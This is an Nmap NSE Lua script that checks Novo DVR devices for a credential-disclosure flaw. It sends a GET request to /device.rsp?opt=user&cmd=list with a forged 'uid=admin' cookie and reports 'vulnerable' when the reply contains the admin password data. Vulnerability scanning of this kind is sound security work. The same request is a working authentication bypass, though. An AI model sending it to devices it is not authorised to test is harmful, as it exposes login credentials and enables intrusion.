local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
    Desc:Novo DVR存在凭证泄露问题，
    攻击者精心构造链接，
    修改cookie信息即可查看返回的登录凭证信息。
]]

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "Novo", "credentials_disclosure", "vuln_detect" }

portrule = shortport.http

action = function(host, port)
    local path = "/device.rsp?opt=user&cmd=list"
    local output = stdnse.output_table()
    local options = {headers={}}
    options["headers"]["cookie"] = "uid=admin"

    local response = http.get(host, port, path, options)

    if response.status == 200 and string.find(response.body, "admin") ~= nil and string.find(response.body, "pwd") ~= nil then
        --stdnse.debug1("[+] found vulnerable.")
        output = "[+] Found vulnerable."
    else
        --stdnse.debug1("[-] not found vulnerable.")
        output = "[-] Not Found vulnerable."
    end
    return output
end
